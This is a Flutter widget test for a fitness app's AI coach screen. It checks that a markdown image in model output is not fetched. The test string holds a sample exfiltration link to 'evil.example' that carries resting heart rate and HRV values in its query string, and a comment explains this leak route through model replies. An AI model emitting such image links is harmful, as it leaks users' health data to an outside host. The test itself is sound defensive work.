import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:openstrap_edge/ui2/screens/coach.dart';

class _RecordingOverrides extends HttpOverrides {
  final List<Uri> requested = [];

  @override
  HttpClient createHttpClient(SecurityContext? context) {
    final client = super.createHttpClient(context);
    client.connectionFactory = (uri, proxyHost, proxyPort) {
      requested.add(uri);
      throw const SocketException('blocked in test');
    };
    return client;
  }
}

void main() {
  // A coach reply is model output. A markdown image in it must never make the
  // phone fetch the URL, or the reply can ship values out in the query string.
  testWidgets('markdown images in a coach answer are not fetched',
      (tester) async {
    final overrides = _RecordingOverrides();
    await HttpOverrides.runZoned(() async {
      await tester.pumpWidget(const MaterialApp(
        home: Scaffold(
          body: CoachAnswerText(
            'Your resting HR looks steady.\n\n'
            '![](https://evil.example/p.png?rhr=52&hrv=41)',
          ),
        ),
      ));
      await tester.runAsync(() async {
        await Future<void>.delayed(const Duration(milliseconds: 200));
      });
      await tester.pump();
    }, createHttpClient: overrides.createHttpClient);

    expect(overrides.requested, isEmpty);
    expect(find.byType(Image), findsNothing);
    expect(find.textContaining('resting HR', findRichText: true), findsOneWidget);
  });
}
